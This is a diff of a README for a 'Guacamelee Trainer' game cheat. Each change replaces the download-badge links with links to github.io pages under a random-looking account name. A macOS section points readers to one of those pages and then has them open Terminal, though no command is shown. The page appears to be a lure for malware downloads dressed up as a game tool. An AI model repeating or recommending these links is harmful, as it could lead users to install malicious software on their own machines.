@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Guacamelee Trainer](https://img.shields.io/badge/⬇_Download_Guacamelee_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
+[![⬇ Download Guacamelee Trainer](https://img.shields.io/badge/⬇_Download_Guacamelee_Trainer-E63946?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
 
 </div>
 
@@ -78,9 +78,9 @@ Guacamelee! is the original luchador Metroidvania blending Día de los Muertos m
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://iloqhmlhfppl.github.io/win-get2/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 </div>
 
@@ -101,7 +101,7 @@ Guacamelee! is the original luchador Metroidvania blending Día de los Muertos m
 
 <div align="center">
 
-[![⬇ Download Guacamelee Trainer](https://img.shields.io/badge/⬇_Download_Guacamelee_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
+[![⬇ Download Guacamelee Trainer](https://img.shields.io/badge/⬇_Download_Guacamelee_Trainer-E63946?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
 
 </div>
 
@@ -133,7 +133,7 @@ Guacamelee! is the original luchador Metroidvania blending Día de los Muertos m
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ Guacamelee! is the original luchador Metroidvania blending Día de los Muertos m
 
 <div align="center">
 
-[![⬇ Download Guacamelee Trainer](https://img.shields.io/badge/⬇_Download_Guacamelee_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
+[![⬇ Download Guacamelee Trainer](https://img.shields.io/badge/⬇_Download_Guacamelee_Trainer-E63946?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
 
 </div>
 
